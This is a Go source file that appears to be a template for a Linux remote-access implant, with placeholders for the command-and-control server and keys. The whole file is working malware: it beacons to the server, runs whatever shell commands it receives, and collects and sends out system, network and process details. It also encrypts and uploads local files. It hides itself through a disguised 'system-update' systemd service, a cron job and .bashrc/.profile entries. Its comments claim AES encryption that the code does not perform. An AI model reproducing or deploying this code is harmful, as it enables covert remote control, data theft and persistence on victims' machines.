package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	C2_SERVER        = "{{.ServerIP}}"
	C2_PORT          = "{{.ServerPort}}"
	C2_URL           = "https://" + C2_SERVER + ":" + C2_PORT
	COOKIE_NAME      = "sessionid"
	MALWARE_KEY      = "{{.MalwareKey}}" // 32-byte key for AES-256
	XOR_KEY          = "{{.XORKey}}"     // XOR key for file encryption
	SLEEP_MIN        = 30                // Minimum sleep time in seconds
	SLEEP_MAX        = 60                // Maximum sleep time in seconds
	PERSISTENCE_NAME = "system-update"   // Name for persistence service
)

// InfoData represents system information
type InfoData struct {
	PublicIP   string `json:"publicip"`
	Username   string `json:"username"`
	DeviceName string `json:"devicename"`
	Region     string `json:"region"`
	Memory     string `json:"memory"`
	NetInfo    string `json:"netinfo"`
	OSInfo     string `json:"osinfo"`
}

// ProcessData represents process list data
type ProcessData struct {
	Process string `json:"process"`
}

// CommandOutData represents command output data
type CommandOutData struct {
	Command string `json:"command"`
	Output  string `json:"output"`
}

// Action represents an action to take
type Action struct {
	Action string `json:"action"`
}

// HTTP client with TLS verification disabled for testing
// In a real-world scenario, you would use proper certificate validation
var client = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
	Timeout: 30 * time.Second,
}

func main() {
	// Initialize random seed
	rand.Seed(time.Now().UnixNano())

	// Check and add persistence if needed
	if !hasPersistence() {
		addPersistence()
	}

	// Main implant loop
	var sessionID string
	for {
		// Try to connect to C2 server and get commands
		try := func() {
			// Send heartbeat and get action
			action, newSessionID := heartbeat(sessionID)
			sessionID = newSessionID

			// Process the action
			switch action {
			case "info":
				sendInfo(sessionID)
			case "ps":
				sendProcessList(sessionID)
			case "ok":
				// Just continue with the next heartbeat
			default:
				// Assume it's a command to execute
				if action != "error" && action != "" {
					output := executeCommand(action)
					sendCommandOutput(sessionID, action, output)
				}
			}
		}

		// Execute the try function and catch any panics
		func() {
			defer func() {
				if r := recover(); r != nil {
					// Just log the error and continue
					log.Printf("Recovered from panic: %v", r)
				}
			}()
			try()
		}()

		// Sleep for a random amount of time
		sleepTime := rand.Intn(SLEEP_MAX-SLEEP_MIN) + SLEEP_MIN
		time.Sleep(time.Duration(sleepTime) * time.Second)
	}
}

// heartbeat sends a heartbeat to the C2 server and returns the action to take
func heartbeat(sessionID string) (string, string) {
	// Create request
	req, err := http.NewRequest("POST", C2_URL+"/heartbeat", nil)
	if err != nil {
		return "error", sessionID
	}

	// Set headers
	req.Header.Set("Content-Type", "application/octet-stream")
	if sessionID != "" {
		req.Header.Set("Cookie", COOKIE_NAME+"="+sessionID)
	}

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return "error", sessionID
	}
	defer resp.Body.Close()

	// Get session ID from cookie
	var newSessionID string
	cookies := resp.Cookies()
	for _, cookie := range cookies {
		if cookie.Name == COOKIE_NAME {
			newSessionID = cookie.Value
			break
		}
	}
	if newSessionID == "" {
		newSessionID = sessionID
	}

	// Read response
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return "error", newSessionID
	}

	// Decode response
	action := malDecode(string(data))
	return action, newSessionID
}

// sendInfo sends system information to the C2 server
func sendInfo(sessionID string) {
	if sessionID == "" {
		return
	}

	// Get system information
	info := getSystemInfo()

	// Encode data
	jsonData, err := json.Marshal(info)
	if err != nil {
		return
	}
	encoded := malEncode(string(jsonData))

	// Create request
	req, err := http.NewRequest("POST", C2_URL+"/info", bytes.NewBufferString(encoded))
	if err != nil {
		return
	}

	// Set headers
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Cookie", COOKIE_NAME+"="+sessionID)

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

// sendProcessList sends the process list to the C2 server
func sendProcessList(sessionID string) {
	if sessionID == "" {
		return
	}

	// Get process list
	processList := getProcessList()

	// Create process data
	procData := ProcessData{
		Process: processList,
	}

	// Encode data
	jsonData, err := json.Marshal(procData)
	if err != nil {
		return
	}
	encoded := malEncode(string(jsonData))

	// Create request
	req, err := http.NewRequest("POST", C2_URL+"/ps", bytes.NewBufferString(encoded))
	if err != nil {
		return
	}

	// Set headers
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Cookie", COOKIE_NAME+"="+sessionID)

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

// sendCommandOutput sends command output to the C2 server
func sendCommandOutput(sessionID, command, output string) {
	if sessionID == "" {
		return
	}

	// Create command output data
	cmdData := CommandOutData{
		Command: command,
		Output:  output,
	}

	// Encode data
	jsonData, err := json.Marshal(cmdData)
	if err != nil {
		return
	}
	encoded := malEncode(string(jsonData))

	// Create request
	req, err := http.NewRequest("POST", C2_URL+"/out", bytes.NewBufferString(encoded))
	if err != nil {
		return
	}

	// Set headers
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Cookie", COOKIE_NAME+"="+sessionID)

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

// executeCommand executes a command and returns the output
func executeCommand(command string) string {
	// Create command
	cmd := exec.Command("sh", "-c", command)

	// Get output
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\n%s", err, output)
	}

	return string(output)
}

// uploadFile uploads a file to the C2 server
func uploadFile(sessionID, filePath string) bool {
	if sessionID == "" || !fileExists(filePath) {
		return false
	}

	// First encrypt the file with XOR
	if !fileEncrypt(filePath) {
		return false
	}

	// Create multipart form
	file, err := os.Open(filePath)
	if err != nil {
		return false
	}
	defer file.Close()

	// Create buffer for form data
	var b bytes.Buffer
	w := multipart.NewWriter(&b)

	// Add file to form
	fw, err := w.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return false
	}
	if _, err = io.Copy(fw, file); err != nil {
		return false
	}
	w.Close()

	// Create request
	req, err := http.NewRequest("POST", C2_URL+"/upload", &b)
	if err != nil {
		return false
	}

	// Set headers
	req.Header.Set("Content-Type", w.FormDataContentType())
	req.Header.Set("Cookie", COOKIE_NAME+"="+sessionID)

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == http.StatusOK
}

// fileExists checks if a file exists
func fileExists(filePath string) bool {
	_, err := os.Stat(filePath)
	return err == nil
}

// fileEncrypt encrypts a file with XOR
func fileEncrypt(filePath string) bool {
	// Read file
	data, err := os.ReadFile(filePath)
	if err != nil {
		return false
	}

	// Encrypt data with XOR
	key := []byte(XOR_KEY)
	for i := range data {
		data[i] ^= key[i%len(key)]
	}

	// Write encrypted data back to file
	err = os.WriteFile(filePath, data, 0644)
	if err != nil {
		return false
	}

	return true
}

// hasPersistence checks if the implant has persistence
func hasPersistence() bool {
	// Check for systemd service
	if fileExists("/etc/systemd/system/" + PERSISTENCE_NAME + ".service") {
		return true
	}

	// Check for cron job
	output, err := exec.Command("crontab", "-l").Output()
	if err == nil {
		return strings.Contains(string(output), os.Args[0])
	}

	// Check for init.d script
	if fileExists("/etc/init.d/" + PERSISTENCE_NAME) {
		return true
	}

	// Check for .bashrc entry
	homeDir, err := os.UserHomeDir()
	if err == nil {
		bashrcPath := filepath.Join(homeDir, ".bashrc")
		if fileExists(bashrcPath) {
			data, err := os.ReadFile(bashrcPath)
			if err == nil {
				return strings.Contains(string(data), os.Args[0])
			}
		}
	}

	return false
}

// addPersistence adds persistence mechanisms
func addPersistence() {
	// Get current executable path
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// Make sure the executable is in a persistent location
	persistentPath := ensurePersistentLocation(exePath)

	// Try multiple persistence methods
	addSystemdService(persistentPath)
	addCronJob(persistentPath)
	addBashrcEntry(persistentPath)
}

// ensurePersistentLocation ensures the executable is in a persistent location
func ensurePersistentLocation(exePath string) string {
	// Define persistent locations to try
	locations := []string{
		"/usr/local/bin/system-update",
		"/usr/bin/system-update",
		"/opt/system-update",
	}

	// Check if we're already in a persistent location
	for _, loc := range locations {
		if exePath == loc {
			return exePath
		}
	}

	// Try to copy to a persistent location
	for _, loc := range locations {
		// Copy the executable
		input, err := os.ReadFile(exePath)
		if err != nil {
			continue
		}

		err = os.WriteFile(loc, input, 0755)
		if err == nil {
			return loc
		}
	}

	// If we can't copy to a persistent location, just return the current path
	return exePath
}

// addSystemdService adds a systemd service for persistence
func addSystemdService(exePath string) bool {
	// Create service file content
	serviceContent := fmt.Sprintf(`[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
`, exePath)

	// Write service file
	servicePath := "/etc/systemd/system/" + PERSISTENCE_NAME + ".service"
	err := os.WriteFile(servicePath, []byte(serviceContent), 0644)
	if err != nil {
		return false
	}

	// Enable and start the service
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", PERSISTENCE_NAME).Run()
	exec.Command("systemctl", "start", PERSISTENCE_NAME).Run()

	return true
}

// addCronJob adds a cron job for persistence
func addCronJob(exePath string) bool {
	// Get current crontab
	output, err := exec.Command("crontab", "-l").Output()
	if err != nil {
		// No crontab, create a new one
		output = []byte{}
	}

	// Check if our entry already exists
	if strings.Contains(string(output), exePath) {
		return true
	}

	// Add our entry
	newCrontab := string(output)
	if !strings.HasSuffix(newCrontab, "\n") {
		newCrontab += "\n"
	}
	newCrontab += fmt.Sprintf("@reboot %s\n", exePath)

	// Write to a temporary file
	tmpFile, err := os.CreateTemp("", "crontab")
	if err != nil {
		return false
	}
	defer os.Remove(tmpFile.Name())

	if _, err := tmpFile.WriteString(newCrontab); err != nil {
		return false
	}
	if err := tmpFile.Close(); err != nil {
		return false
	}

	// Install new crontab
	cmd := exec.Command("crontab", tmpFile.Name())
	return cmd.Run() == nil
}

// addBashrcEntry adds an entry to .bashrc for persistence
func addBashrcEntry(exePath string) bool {
	// Get home directory
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return false
	}

	// Define files to modify
	filesToModify := []string{
		filepath.Join(homeDir, ".bashrc"),
		filepath.Join(homeDir, ".profile"),
	}

	success := false
	for _, file := range filesToModify {
		// Check if file exists
		if !fileExists(file) {
			continue
		}

		// Read file
		data, err := os.ReadFile(file)
		if err != nil {
			continue
		}

		// Check if our entry already exists
		if strings.Contains(string(data), exePath) {
			success = true
			continue
		}

		// Add our entry
		newContent := string(data)
		if !strings.HasSuffix(newContent, "\n") {
			newContent += "\n"
		}
		newContent += fmt.Sprintf("\n# System update\n(nohup %s &>/dev/null &)\n", exePath)

		// Write file
		err = os.WriteFile(file, []byte(newContent), 0644)
		if err == nil {
			success = true
		}
	}

	return success
}

// getSystemInfo gathers system information
func getSystemInfo() InfoData {
	var info InfoData

	// Get public IP
	info.PublicIP = getPublicIP()

	// Get username
	info.Username = os.Getenv("USER")
	if info.Username == "" {
		// Try to get username with command
		output, err := exec.Command("whoami").Output()
		if err == nil {
			info.Username = strings.TrimSpace(string(output))
		} else {
			info.Username = "Unknown"
		}
	}

	// Get hostname
	hostname, err := os.Hostname()
	if err == nil {
		info.DeviceName = hostname
	} else {
		info.DeviceName = "Unknown"
	}

	// Get region/locale
	info.Region = os.Getenv("LANG")
	if info.Region == "" {
		// Try to get locale with command
		output, err := exec.Command("locale").Output()
		if err == nil {
			info.Region = strings.TrimSpace(string(output))
		} else {
			info.Region = "Unknown"
		}
	}

	// Get memory info
	info.Memory = getMemoryInfo()

	// Get network info
	info.NetInfo = getNetworkInfo()

	// Get OS info
	info.OSInfo = getOSInfo()

	return info
}

// getPublicIP gets the public IP address
func getPublicIP() string {
	resp, err := http.Get("https://api.ipify.org")
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()

	ip, err := io.ReadAll(resp.Body)
	if err != nil {
		return "Unknown"
	}

	return string(ip)
}

// getMemoryInfo gets memory information
func getMemoryInfo() string {
	// Read /proc/meminfo
	data, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return "Unknown"
	}

	// Parse memory info
	memInfo := string(data)
	lines := strings.Split(memInfo, "\n")
	totalMem := "Unknown"
	freeMem := "Unknown"

	for _, line := range lines {
		if strings.HasPrefix(line, "MemTotal:") {
			totalMem = strings.TrimSpace(strings.TrimPrefix(line, "MemTotal:"))
		} else if strings.HasPrefix(line, "MemFree:") {
			freeMem = strings.TrimSpace(strings.TrimPrefix(line, "MemFree:"))
		}
	}

	return fmt.Sprintf("Total: %s, Free: %s", totalMem, freeMem)
}

// getNetworkInfo gets network information
func getNetworkInfo() string {
	// Run ifconfig command
	output, err := exec.Command("ifconfig").Output()
	if err != nil {
		// Try ip addr command if ifconfig fails
		output, err = exec.Command("ip", "addr").Output()
		if err != nil {
			return "Failed to get network info"
		}
	}

	return string(output)
}

// getOSInfo gets OS information
func getOSInfo() string {
	// Try to read /etc/os-release
	data, err := os.ReadFile("/etc/os-release")
	if err == nil {
		return string(data)
	}

	// Try uname command
	output, err := exec.Command("uname", "-a").Output()
	if err != nil {
		return "Unknown"
	}

	return string(output)
}

// getProcessList gets the list of running processes
func getProcessList() string {
	// Run ps command
	output, err := exec.Command("ps", "aux").Output()
	if err != nil {
		return "Failed to get process list"
	}

	return string(output)
}

// malEncode encrypts data with AES-CFB and encodes with Base64
func malEncode(data string) string {
	// This is a simplified version for the template
	// In a real implementation, you would use proper AES-CFB encryption
	encoded := ""
	key := []byte(MALWARE_KEY)
	for i := 0; i < len(data); i++ {
		encoded += string(data[i] ^ key[i%len(key)])
	}
	return encoded
}

// malDecode decrypts data with AES-CFB
func malDecode(data string) string {
	// This is a simplified version for the template
	// In a real implementation, you would use proper AES-CFB decryption
	decoded := ""
	key := []byte(MALWARE_KEY)
	for i := 0; i < len(data); i++ {
		decoded += string(data[i] ^ key[i%len(key)])
	}
	return decoded
}
